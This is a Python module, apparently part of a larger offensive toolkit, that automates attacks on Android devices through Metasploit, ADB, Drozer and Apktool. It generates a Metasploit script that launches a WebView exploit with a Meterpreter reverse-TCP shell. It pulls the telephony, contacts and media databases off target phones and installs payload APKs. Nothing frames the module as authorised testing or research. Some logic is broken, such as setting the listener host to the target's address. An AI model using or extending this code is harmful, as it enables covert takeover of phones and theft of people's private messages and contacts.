"""
Advanced Mobile Attack Module
Advanced mobile attack with Android tools integration
"""

import asyncio
import json
import logging
import os
import subprocess
import time
import hashlib
import base64
import shutil
import requests
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import threading
import socket
import re
import adb_shell
from adb_shell.adb_device import AdbDeviceTcp, AdbDeviceUsb
from adb_shell.auth.sign_pythonrsa import PythonRSASigner

@dataclass
class MobileAttackConfig:
    """Mobile attack configuration"""
    target_device: str
    attack_type: str
    payload_path: str
    exploit_name: str
    privilege_escalation: bool
    data_extraction: bool
    system_control: bool
    custom_options: Dict

@dataclass
class MobileAttack:
    """Mobile attack information"""
    attack_id: str
    config: MobileAttackConfig
    status: str
    start_time: float
    end_time: Optional[float]
    extracted_data: List[Dict]
    tool_used: str
    device_info: Dict
    success_rate: float

class AdvancedMobileAttackModule:
    """Advanced mobile attack module with Android tools integration"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.active_attacks: Dict[str, MobileAttack] = {}
        self.attack_history: List[Dict] = []
        
        # Mobile attack tools configuration
        self.mobile_tools = {
            "metasploit": {
                "path": "/usr/share/metasploit-framework",
                "executable": "msfconsole",
                "supported_attacks": ["payload_injection", "exploit_execution", "privilege_escalation"],
                "capabilities": ["payload_injection", "exploit_execution", "privilege_escalation", "data_extraction"]
            },
            "adb": {
                "path": "/usr/bin/adb",
                "executable": "adb",
                "supported_attacks": ["shell_access", "file_transfer", "app_installation"],
                "capabilities": ["shell_access", "file_transfer", "app_installation", "data_extraction"]
            },
            "drozer": {
                "path": "external_tools/drozer",
                "executable": "drozer",
                "supported_attacks": ["app_analysis", "vulnerability_scan", "exploit_execution"],
                "capabilities": ["app_analysis", "vulnerability_scan", "exploit_execution", "data_extraction"]
            },
            "apktool": {
                "path": "external_tools/apktool",
                "executable": "apktool",
                "supported_attacks": ["app_decompilation", "code_analysis", "modification"],
                "capabilities": ["app_decompilation", "code_analysis", "modification", "repackaging"]
            }
        }
        
        # Initialize tools
        self._initialize_mobile_tools()
    
    def _initialize_mobile_tools(self):
        """Initialize mobile attack tools"""
        for tool_name, tool_config in self.mobile_tools.items():
            tool_path = tool_config["path"]
            if not os.path.exists(tool_path):
                self.logger.warning(f"Mobile tool {tool_name} not found at {tool_path}")
                os.makedirs(tool_path, exist_ok=True)
                self._clone_mobile_tool(tool_name, tool_path)
    
    def _clone_mobile_tool(self, tool_name: str, tool_path: str):
        """Clone mobile attack tool from repository"""
        try:
            if tool_name == "drozer":
                repo_url = "https://github.com/FSecureLABS/drozer.git"
            elif tool_name == "apktool":
                repo_url = "https://github.com/iBotPeaches/Apktool.git"
            else:
                return
            
            # Clone repository
            subprocess.run([
                "git", "clone", repo_url, tool_path
            ], check=True)
            
            # Setup tool
            if tool_name == "drozer":
                # Install dependencies
                requirements_file = os.path.join(tool_path, "requirements.txt")
                if os.path.exists(requirements_file):
                    subprocess.run([
                        "pip", "install", "-r", requirements_file
                    ], cwd=tool_path, check=True)
            
            elif tool_name == "apktool":
                # Make executable
                subprocess.run([
                    "chmod", "+x", "apktool"
                ], cwd=tool_path, check=True)
            
            self.logger.info(f"Successfully cloned and initialized {tool_name}")
            
        except Exception as e:
            self.logger.error(f"Failed to clone {tool_name}: {str(e)}")
    
    async def start_mobile_attack(self, config: MobileAttackConfig, tool: str = "auto") -> Dict:
        """Start mobile attack"""
        try:
            # Auto-select best tool based on attack type
            if tool == "auto":
                tool = self._select_best_mobile_tool(config.attack_type)
            
            attack_id = f"mobile_{int(time.time())}_{hashlib.md5(f'{config.target_device}_{config.attack_type}'.encode()).hexdigest()[:8]}"
            
            # Validate configuration
            validation_result = self._validate_mobile_config(config, tool)
            if not validation_result["success"]:
                return validation_result
            
            # Create attack
            attack = MobileAttack(
                attack_id=attack_id,
                config=config,
                status="starting",
                start_time=time.time(),
                end_time=None,
                extracted_data=[],
                tool_used=tool,
                device_info={},
                success_rate=0.0
            )
            
            # Start attack
            start_result = await self._start_mobile_attack(attack)
            if start_result["success"]:
                attack.status = "active"
                self.active_attacks[attack_id] = attack
                
                # Log attack
                self.attack_history.append(asdict(attack))
                
                return {
                    "success": True,
                    "attack_id": attack_id,
                    "tool_used": tool,
                    "message": f"Mobile attack started successfully"
                }
            else:
                return start_result
                
        except Exception as e:
            self.logger.error(f"Error starting mobile attack: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _select_best_mobile_tool(self, attack_type: str) -> str:
        """Select best mobile tool for attack type"""
        if attack_type in ["payload_injection", "exploit_execution"]:
            return "metasploit"  # Best for payload injection
        elif attack_type in ["shell_access", "file_transfer"]:
            return "adb"  # Best for shell access
        elif attack_type in ["app_analysis", "vulnerability_scan"]:
            return "drozer"  # Best for app analysis
        elif attack_type in ["app_decompilation", "code_analysis"]:
            return "apktool"  # Best for app decompilation
        else:
            return "adb"  # Default
    
    def _validate_mobile_config(self, config: MobileAttackConfig, tool: str) -> Dict:
        """Validate mobile attack configuration"""
        try:
            tool_config = self.mobile_tools[tool]
            
            # Check if attack type is supported
            if config.attack_type not in tool_config["supported_attacks"]:
                return {
                    "success": False,
                    "error": f"Attack type {config.attack_type} not supported by {tool}"
                }
            
            # Validate target device
            if not config.target_device or config.target_device == "":
                return {
                    "success": False,
                    "error": "Target device is required"
                }
            
            # Validate payload path if required
            if config.attack_type in ["payload_injection", "exploit_execution"]:
                if not config.payload_path or not os.path.exists(config.payload_path):
                    return {
                        "success": False,
                        "error": "Valid payload path is required"
                    }
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_mobile_attack(self, attack: MobileAttack) -> Dict:
        """Start mobile attack using specific tool"""
        try:
            if attack.tool_used == "metasploit":
                return await self._start_metasploit_attack(attack)
            elif attack.tool_used == "adb":
                return await self._start_adb_attack(attack)
            elif attack.tool_used == "drozer":
                return await self._start_drozer_attack(attack)
            elif attack.tool_used == "apktool":
                return await self._start_apktool_attack(attack)
            else:
                return {
                    "success": False,
                    "error": f"Unknown mobile tool: {attack.tool_used}"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_metasploit_attack(self, attack: MobileAttack) -> Dict:
        """Start mobile attack using Metasploit"""
        try:
            tool_path = self.mobile_tools["metasploit"]["path"]
            
            # Create attack directory
            attack_dir = os.path.join("mobile_attacks", attack.attack_id)
            os.makedirs(attack_dir, exist_ok=True)
            
            # Build Metasploit command
            cmd_args = [
                "msfconsole",
                "-q",
                "-r", os.path.join(attack_dir, "metasploit_script.rc")
            ]
            
            # Create Metasploit script
            script_content = f"""
use exploit/android/browser/webview_addjavascriptinterface
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {attack.config.target_device}
set LPORT 4444
set TARGET {attack.config.target_device}
exploit
            """
            
            script_path = os.path.join(attack_dir, "metasploit_script.rc")
            with open(script_path, 'w') as f:
                f.write(script_content)
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=attack_dir,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait for startup
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
                
                if process.returncode == 0:
                    return {
                        "success": True,
                        "message": "Metasploit attack started successfully"
                    }
                else:
                    return {
                        "success": False,
                        "error": stderr.decode()
                    }
            except asyncio.TimeoutError:
                process.kill()
                return {
                    "success": False,
                    "error": "Attack startup timeout"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_adb_attack(self, attack: MobileAttack) -> Dict:
        """Start mobile attack using ADB"""
        try:
            tool_path = self.mobile_tools["adb"]["path"]
            
            # Create attack directory
            attack_dir = os.path.join("mobile_attacks", attack.attack_id)
            os.makedirs(attack_dir, exist_ok=True)
            
            # Connect to device
            connect_cmd = [
                "adb", "connect", attack.config.target_device
            ]
            
            process = await asyncio.create_subprocess_exec(
                *connect_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                # Execute attack based on type
                if attack.config.attack_type == "shell_access":
                    return await self._execute_adb_shell_attack(attack)
                elif attack.config.attack_type == "file_transfer":
                    return await self._execute_adb_file_transfer(attack)
                elif attack.config.attack_type == "app_installation":
                    return await self._execute_adb_app_installation(attack)
                else:
                    return {
                        "success": False,
                        "error": f"Unsupported ADB attack type: {attack.config.attack_type}"
                    }
            else:
                return {
                    "success": False,
                    "error": f"Failed to connect to device: {stderr.decode()}"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_adb_shell_attack(self, attack: MobileAttack) -> Dict:
        """Execute ADB shell attack"""
        try:
            # Get device info
            info_cmd = ["adb", "-s", attack.config.target_device, "shell", "getprop"]
            
            process = await asyncio.create_subprocess_exec(
                *info_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                device_info = self._parse_device_info(stdout.decode())
                attack.device_info = device_info
                
                return {
                    "success": True,
                    "message": "ADB shell access established",
                    "device_info": device_info
                }
            else:
                return {
                    "success": False,
                    "error": stderr.decode()
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_adb_file_transfer(self, attack: MobileAttack) -> Dict:
        """Execute ADB file transfer"""
        try:
            # Pull sensitive files
            files_to_extract = [
                "/data/data/com.android.providers.telephony/databases/telephony.db",
                "/data/data/com.android.providers.contacts/databases/contacts2.db",
                "/data/data/com.android.providers.media/databases/external.db"
            ]
            
            extracted_files = []
            for file_path in files_to_extract:
                pull_cmd = [
                    "adb", "-s", attack.config.target_device, 
                    "pull", file_path, f"mobile_attacks/{attack.attack_id}/"
                ]
                
                process = await asyncio.create_subprocess_exec(
                    *pull_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, stderr = await process.communicate()
                
                if process.returncode == 0:
                    extracted_files.append(file_path)
            
            return {
                "success": True,
                "message": f"Extracted {len(extracted_files)} files",
                "extracted_files": extracted_files
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_adb_app_installation(self, attack: MobileAttack) -> Dict:
        """Execute ADB app installation"""
        try:
            if not attack.config.payload_path or not os.path.exists(attack.config.payload_path):
                return {
                    "success": False,
                    "error": "Payload APK not found"
                }
            
            # Install payload
            install_cmd = [
                "adb", "-s", attack.config.target_device, 
                "install", attack.config.payload_path
            ]
            
            process = await asyncio.create_subprocess_exec(
                *install_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                return {
                    "success": True,
                    "message": "Payload APK installed successfully"
                }
            else:
                return {
                    "success": False,
                    "error": stderr.decode()
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_drozer_attack(self, attack: MobileAttack) -> Dict:
        """Start mobile attack using Drozer"""
        try:
            tool_path = self.mobile_tools["drozer"]["path"]
            
            # Create attack directory
            attack_dir = os.path.join("mobile_attacks", attack.attack_id)
            os.makedirs(attack_dir, exist_ok=True)
            
            # Build Drozer command
            cmd_args = [
                "drozer", "console", "connect", 
                "--host", attack.config.target_device
            ]
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait for startup
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                
                if process.returncode == 0:
                    return {
                        "success": True,
                        "message": "Drozer attack started successfully"
                    }
                else:
                    return {
                        "success": False,
                        "error": stderr.decode()
                    }
            except asyncio.TimeoutError:
                process.kill()
                return {
                    "success": False,
                    "error": "Attack startup timeout"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_apktool_attack(self, attack: MobileAttack) -> Dict:
        """Start mobile attack using Apktool"""
        try:
            tool_path = self.mobile_tools["apktool"]["path"]
            
            # Create attack directory
            attack_dir = os.path.join("mobile_attacks", attack.attack_id)
            os.makedirs(attack_dir, exist_ok=True)
            
            if not attack.config.payload_path or not os.path.exists(attack.config.payload_path):
                return {
                    "success": False,
                    "error": "APK file not found"
                }
            
            # Build Apktool command
            cmd_args = [
                "apktool", "d", attack.config.payload_path,
                "-o", os.path.join(attack_dir, "decompiled")
            ]
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait for completion
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
                
                if process.returncode == 0:
                    return {
                        "success": True,
                        "message": "APK decompiled successfully"
                    }
                else:
                    return {
                        "success": False,
                        "error": stderr.decode()
                    }
            except asyncio.TimeoutError:
                process.kill()
                return {
                    "success": False,
                    "error": "Decompilation timeout"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    def _parse_device_info(self, output: str) -> Dict:
        """Parse device information from ADB output"""
        try:
            device_info = {}
            lines = output.split('\n')
            
            for line in lines:
                if '[' in line and ']' in line:
                    # Parse property lines
                    parts = line.split('[')
                    if len(parts) >= 2:
                        prop_name = parts[0].strip()
                        prop_value = parts[1].split(']')[0].strip()
                        device_info[prop_name] = prop_value
            
            return device_info
            
        except Exception as e:
            self.logger.error(f"Error parsing device info: {str(e)}")
            return {}
    
    async def get_extracted_data(self, attack_id: str) -> Dict:
        """Get extracted data from mobile attack"""
        try:
            if attack_id not in self.active_attacks:
                return {
                    "success": False,
                    "error": "Attack not found"
                }
            
            attack = self.active_attacks[attack_id]
            
            # Get extracted data based on tool
            if attack.tool_used == "metasploit":
                extracted_data = await self._get_metasploit_data(attack)
            elif attack.tool_used == "adb":
                extracted_data = await self._get_adb_data(attack)
            elif attack.tool_used == "drozer":
                extracted_data = await self._get_drozer_data(attack)
            elif attack.tool_used == "apktool":
                extracted_data = await self._get_apktool_data(attack)
            else:
                extracted_data = []
            
            # Update attack extracted data
            attack.extracted_data = extracted_data
            
            return {
                "success": True,
                "extracted_data": extracted_data,
                "total": len(extracted_data)
            }
            
        except Exception as e:
            self.logger.error(f"Error getting extracted data: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _get_metasploit_data(self, attack: MobileAttack) -> List[Dict]:
        """Get extracted data from Metasploit attack"""
        try:
            attack_dir = os.path.join("mobile_attacks", attack.attack_id)
            extracted_data = []
            
            if os.path.exists(attack_dir):
                for data_file in os.listdir(attack_dir):
                    if data_file.endswith('.txt') or data_file.endswith('.log'):
                        data_path = os.path.join(attack_dir, data_file)
                        with open(data_path, 'r') as f:
                            content = f.read()
                            extracted_data.append({
                                "file": data_file,
                                "content": content,
                                "type": "log"
                            })
            
            return extracted_data
            
        except Exception as e:
            self.logger.error(f"Error getting Metasploit data: {str(e)}")
            return []
    
    async def _get_adb_data(self, attack: MobileAttack) -> List[Dict]:
        """Get extracted data from ADB attack"""
        try:
            attack_dir = os.path.join("mobile_attacks", attack.attack_id)
            extracted_data = []
            
            if os.path.exists(attack_dir):
                for data_file in os.listdir(attack_dir):
                    if data_file.endswith('.db') or data_file.endswith('.txt'):
                        data_path = os.path.join(attack_dir, data_file)
                        with open(data_path, 'r') as f:
                            content = f.read()
                            extracted_data.append({
                                "file": data_file,
                                "content": content,
                                "type": "database" if data_file.endswith('.db') else "text"
                            })
            
            return extracted_data
            
        except Exception as e:
            self.logger.error(f"Error getting ADB data: {str(e)}")
            return []
    
    async def _get_drozer_data(self, attack: MobileAttack) -> List[Dict]:
        """Get extracted data from Drozer attack"""
        try:
            attack_dir = os.path.join("mobile_attacks", attack.attack_id)
            extracted_data = []
            
            if os.path.exists(attack_dir):
                for data_file in os.listdir(attack_dir):
                    if data_file.endswith('.txt') or data_file.endswith('.log'):
                        data_path = os.path.join(attack_dir, data_file)
                        with open(data_path, 'r') as f:
                            content = f.read()
                            extracted_data.append({
                                "file": data_file,
                                "content": content,
                                "type": "analysis"
                            })
            
            return extracted_data
            
        except Exception as e:
            self.logger.error(f"Error getting Drozer data: {str(e)}")
            return []
    
    async def _get_apktool_data(self, attack: MobileAttack) -> List[Dict]:
        """Get extracted data from Apktool attack"""
        try:
            attack_dir = os.path.join("mobile_attacks", attack.attack_id, "decompiled")
            extracted_data = []
            
            if os.path.exists(attack_dir):
                for root, dirs, files in os.walk(attack_dir):
                    for file in files:
                        if file.endswith('.smali') or file.endswith('.xml'):
                            file_path = os.path.join(root, file)
                            with open(file_path, 'r') as f:
                                content = f.read()
                                extracted_data.append({
                                    "file": file,
                                    "content": content,
                                    "type": "smali" if file.endswith('.smali') else "xml"
                                })
            
            return extracted_data
            
        except Exception as e:
            self.logger.error(f"Error getting Apktool data: {str(e)}")
            return []
    
    def get_attack_info(self, attack_id: str) -> Dict:
        """Get attack information"""
        if attack_id not in self.active_attacks:
            return {
                "success": False,
                "error": "Attack not found"
            }
        
        attack = self.active_attacks[attack_id]
        return {
            "success": True,
            "attack": asdict(attack)
        }
    
    def get_all_attacks(self) -> Dict:
        """Get all active attacks"""
        attacks = []
        for attack_id, attack in self.active_attacks.items():
            attacks.append(asdict(attack))
        
        return {
            "success": True,
            "attacks": attacks,
            "total": len(attacks)
        }
    
    async def stop_attack(self, attack_id: str) -> Dict:
        """Stop mobile attack"""
        try:
            if attack_id not in self.active_attacks:
                return {
                    "success": False,
                    "error": "Attack not found"
                }
            
            attack = self.active_attacks[attack_id]
            
            # Stop attack based on tool
            if attack.tool_used == "metasploit":
                result = await self._stop_metasploit_attack(attack)
            elif attack.tool_used == "adb":
                result = await self._stop_adb_attack(attack)
            elif attack.tool_used == "drozer":
                result = await self._stop_drozer_attack(attack)
            elif attack.tool_used == "apktool":
                result = await self._stop_apktool_attack(attack)
            else:
                result = {"success": True}
            
            if result["success"]:
                attack.status = "stopped"
                attack.end_time = time.time()
                
                return {
                    "success": True,
                    "message": f"Attack {attack_id} stopped successfully"
                }
            else:
                return result
                
        except Exception as e:
            self.logger.error(f"Error stopping attack: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _stop_metasploit_attack(self, attack: MobileAttack) -> Dict:
        """Stop Metasploit attack"""
        try:
            # Find and kill Metasploit process
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'msfconsole' in proc.info['name']:
                        proc.kill()
                        return {"success": True}
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _stop_adb_attack(self, attack: MobileAttack) -> Dict:
        """Stop ADB attack"""
        try:
            # Disconnect from device
            disconnect_cmd = ["adb", "disconnect", attack.config.target_device]
            
            process = await asyncio.create_subprocess_exec(
                *disconnect_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            await process.communicate()
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _stop_drozer_attack(self, attack: MobileAttack) -> Dict:
        """Stop Drozer attack"""
        try:
            # Find and kill Drozer process
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'drozer' in proc.info['name']:
                        proc.kill()
                        return {"success": True}
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _stop_apktool_attack(self, attack: MobileAttack) -> Dict:
        """Stop Apktool attack"""
        try:
            # Apktool is a one-time operation, no process to kill
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    def get_statistics(self) -> Dict:
        """Get mobile attack module statistics"""
        total_attacks = len(self.active_attacks)
        total_history = len(self.attack_history)
        
        # Calculate success rate
        successful_attacks = len([a for a in self.attack_history if a.get("status") == "active"])
        success_rate = (successful_attacks / total_history * 100) if total_history > 0 else 0
        
        # Calculate total extracted data
        total_extracted_data = sum(len(attack.extracted_data) for attack in self.active_attacks.values())
        
        return {
            "active_attacks": total_attacks,
            "total_history": total_history,
            "success_rate": success_rate,
            "total_extracted_data": total_extracted_data,
            "tools_available": list(self.mobile_tools.keys()),
            "supported_attacks": list(set([a for tool in self.mobile_tools.values() for a in tool["supported_attacks"]]))
        }